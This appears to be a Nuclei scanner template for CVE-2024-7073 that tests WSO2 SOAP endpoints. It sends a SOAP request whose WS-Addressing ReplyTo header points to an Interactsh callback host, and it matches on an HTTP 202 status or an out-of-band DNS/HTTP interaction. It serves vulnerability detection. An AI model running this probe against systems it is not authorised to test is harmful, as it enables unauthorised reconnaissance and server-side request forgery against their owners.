id: CVE-2024-7073
info:
  name: SOAP WS-Addressing ReplyTo Interaction Test
  author: 9r0v3r
  severity: Critical
  description: |
    Sends a SOAP request with WS-Addressing ReplyTo header pointing to Interactsh.
    Matches on HTTP 202 response OR DNS/HTTP interaction.
  tags: soap,wso2

http:
  - raw:
      - |
        POST /service HTTP/2
        Host: {{Hostname}}
        Content-Type: text/xml
        Soapaction: "urn:xxx"

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                          xmlns:wsa="http://www.w3.org/2005/08/addressing">
          <soapenv:Header>
            <wsa:Action>urn:xxx</wsa:Action>
            <wsa:ReplyTo>
              <wsa:Address>http://{{interactsh-url}}</wsa:Address>
            </wsa:ReplyTo>
          </soapenv:Header>
          <soapenv:Body>
            <a>b</a>
          </soapenv:Body>
        </soapenv:Envelope>
        
    redirects: true
    max-redirects: 3

    matchers-condition: or
    matchers:
      - type: status
        status:
          - 202

      - type: word
        part: interactsh_protocol
        words: ["dns","http", "https"]

